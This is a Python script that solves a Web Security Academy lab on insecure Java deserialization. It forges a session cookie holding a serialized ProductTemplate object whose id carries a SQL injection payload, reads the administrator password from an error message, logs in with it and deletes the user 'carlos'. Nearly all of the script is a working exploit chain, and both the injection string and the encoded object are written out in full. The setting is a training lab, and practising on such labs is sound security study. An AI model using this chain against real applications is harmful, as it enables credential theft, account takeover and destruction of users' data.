from web_security_academy.core.logger import logger
from urllib.parse import quote

import re


def solve_lab(session):
    logger.info("Source code found at /backup/")

    # Explanation: When the data.productcatalog.ProductTemplate class is deserialized,
    # it makes a PostgreSQL query using the variable "id". This query is vulnerable to
    # a SQL injection. Therefore, we can replace the session cookie with a serialized
    # ProductTemplate where "id" is a SQL injection payload. I used the following
    # payload to extract the administrator password via a visible error message:

    # ' UNION SELECT null, null, null, CAST((SELECT password FROM users WHERE username='administrator') AS int), null, null, null, null -- //

    serial = (
        "rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAAC"
        "aWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAhycgVU5JT04gU0VMRUNUIG51bGwsIG51bGwsIG51"
        "bGwsIENBU1QoKFNFTEVDVCBwYXNzd29yZCBGUk9NIHVzZXJzIFdIRVJFIHVzZXJuYW1lPSdhZG1p"
        "bmlzdHJhdG9yJykgQVMgaW50KSwgbnVsbCwgbnVsbCwgbnVsbCwgbnVsbCAtLSAvLw=="
    )
    session.cookies.set("session", quote(serial))
    logger.info("Embedded serialized object as session cookie")

    resp = session.get_path("/")
    query = re.search(r"&quot;(.+)&quot;", resp.text)
    if query is None:
        logger.failure("Unable to extract administrator password")
        return

    password = query.group(1)
    logger.info(f"Extracted administrator password: {password}")

    session.cookies.clear_session_cookies()
    session.login("administrator", password, with_csrf=False)
    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
